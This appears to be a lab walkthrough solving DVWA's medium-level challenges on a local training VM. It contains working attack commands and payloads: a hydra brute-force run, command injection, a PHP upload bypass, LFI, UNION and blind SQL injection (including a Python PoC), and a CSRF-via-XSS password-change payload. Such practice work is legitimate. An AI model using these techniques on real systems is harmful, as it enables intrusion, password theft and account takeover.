
### Target

    https://github.com/ethicalhack3r/DVWA

    Security level: medium

### Prereq

    # get user token
    $ TOKEN=$(curl -c dvwa.session -s http://192.168.56.101/DVWA/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)

    # get session id
    $ PHPSESSID=$(grep PHPSESSID dvwa.session | awk -F' ' '{print $7}')

    # log in
    $ curl -L -b "PHPSESSID=${PHPSESSID};security=medium" -v -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" http://192.168.56.101/DVWA/login.php

### Brute Force

    $ wget https://raw.githubusercontent.com/seifreed/dirb/master/wordlists/others/best110.txt

    $ hydra -t 8 -l admin -P best110.txt -vV 192.168.56.101 http-get-form "/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:F=password incorrect:H=Cookie: PHPSESSID=${PHPSESSID};security=medium"

### Command Injection

```
# '\n' as a bash commands separtor
$ curl -s -b "PHPSESSID=${PHPSESSID};security=medium" -d 'ip=%0auname+-a&Submit=Submit' http://192.168.56.101/DVWA/vulnerabilities/exec/index.php | grep Linux    

OR

# '&' as a bash commands separtor
$ curl -s -b "PHPSESSID=${PHPSESSID};security=medium" -d 'ip=%26uname+-a&Submit=Submit' http://192.168.56.101/DVWA/vulnerabilities/exec/index.php | grep Linux    
```

### File Upload

**Vuln:** insufficient file type validation - looking only at filetype controlled by the user ($_FILES['userfile']['type'])

**Exploitation**

```
cat > b.php <<EOF
<?php phpinfo(); ?>
EOF

curl -x 127.0.0.1:8080 -L -b "PHPSESSID=${PHPSESSID};security=medium" -F "MAX_FILE_SIZE=100000" -F "uploaded=@b.php;type=image/jpeg;filename=b.php" -F "Upload=Upload" http://192.168.56.101/DVWA/vulnerabilities/upload/index.php

curl -s -b "PHPSESSID=${PHPSESSID};security=medium" http://192.168.56.101/DVWA/hackable/uploads/b.php
```

### File Inclusion

**Vuln:** insufficient input validation

**Exploitation**

```
# LFI:
$ curl -L -b "PHPSESSID=${PHPSESSID};security=medium" -v http://192.168.56.101/DVWA/vulnerabilities/fi/?page=..././..././hackable/flags/fi.php

# RFI payload example:
hTTp://
```

### Sql Injection

**Vuln:** incorrect use of mysqli_real_escape_string function: now quotes are used so input is treated as integer

Payload to retreive users password fields:

```
1 union select Password, User from users#
```

**Exploitation**

```
$ curl -s -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=medium" "http://192.168.56.102/DVWA/vulnerabilities/sqli/index.php" -d 'id=1+union+select+Password%2CUser+FROM+users%23&Submit=Submit'
```

### Sql Injection (Blind)

**Vulnerability**

Payloads:

```
true condtion: 1 and 1=1#
false condition: 1 and 1=0#
```

**Exploitation**

Manual:

```
# dependency:
https://stackoverflow.com/questions/296536/how-to-urlencode-data-for-curl-command

# true condition:
curl -s -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=medium" "http://192.168.56.102/DVWA/vulnerabilities/sqli_blind/index.php" -d "id=$(rawurlencode "1 and 1=1#")&Submit=Submit"

# false condition:
curl -s -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=medium" "http://192.168.56.102/DVWA/vulnerabilities/sqli_blind/index.php" -d "id=$(rawurlencode "1 and 1=0#")&Submit=Submit"
```

Retreiving DBMS version PoC:

```
cat > poc.py <<EOF
"""
example output of @@version: 5.7.16-0ubuntu0.16.04.1

first find length of the @@version string:
1 and length(@@version)=7#

iterate thru printable ASCII and retreive @@version string
1 and ascii(substring(@@version,1,1))=0x35#
"""

import requests
import string
from urllib import quote, unquote

proxies = {
    "http" : "http://127.0.0.1:8080/"
}

# initiate HTTP session
session = requests.Session()
session.cookies['security'] = 'medium'
session.cookies['PHPSESSID'] = 'sg9087bvkh5pu14tarpakuqf25'

u = 'http://192.168.56.102/DVWA/vulnerabilities/sqli_blind/index.php'

# find length of @@version string
for i in xrange(1, 30):
    payload = "1 and length(@@version)=" + str(i) + "#"
    params = {'id': payload, 'Submit': "Submit"}
    resp = session.post(u, data=params, proxies=proxies)

    if resp.text.find("MISSING") == -1:
        len = i
        break

# retreive @@version string
version=""
for i in xrange(1, len + 1):
    for c in string.printable:
        payload = "1 and ascii(substring(@@version,{0},1))={1}#".format(i, hex(ord(c)))
        params = {'id': payload, 'Submit': "Submit"}
        resp = session.post(u, data=params, proxies=proxies)

        if resp.text.find("MISSING") == -1:
            print payload
            version += c

print version
EOF
```

### CSRF

XSS vulnerability on the DVWA site (for example this in `http://192.168.56.102/DVWA/vulnerabilities/xss_r`) needs to be used in order do defeat `Referer` check:

```
# trick victim to visit (while logged in to DVWA) the following:
http://192.168.56.102/DVWA/vulnerabilities/xss_r/?name=%3C/pre%3E%3CScRiPt%3Enew%20Image().src=%22http://192.168.56.102/DVWA/vulnerabilities/csrf/?password_new=pass2%26password_conf=pass2%26Change=Change%22%3C%2Fscript%3E%3Cpre%3E#

OR

# trick victim to visit 3rd party site (while logged in to DVWA) with already planted iframe:
<iframe SRC='http://192.168.56.102/DVWA/vulnerabilities/xss_r/?name=%3C/pre%3E%3CScRiPt%3Enew%20Image().src=%22http://192.168.56.102/DVWA/vulnerabilities/csrf/?password_new=pass3%26password_conf=pass3%26Change=Change%22%3C%2Fscript%3E%3Cpre%3E#' height="0" width="0"></iframe>
```

### XSS (Reflected)

    http://192.168.56.102/DVWA/vulnerabilities/xss_r/?name=%3C/pre%3E%3CScRiPt%3Ealert(1)%3C%2Fscript%3E%3Cpre%3E#

### XSS (DOM)

Payload that ilustrates vulnerability (this time filtering is done on server side so we use anchor '#' to prevent it from sending to the server:

    English#<script>alert(1);</script>

Or do not use 'script' tags:

    English</option></select><img src='x' onerror='alert(1)'>
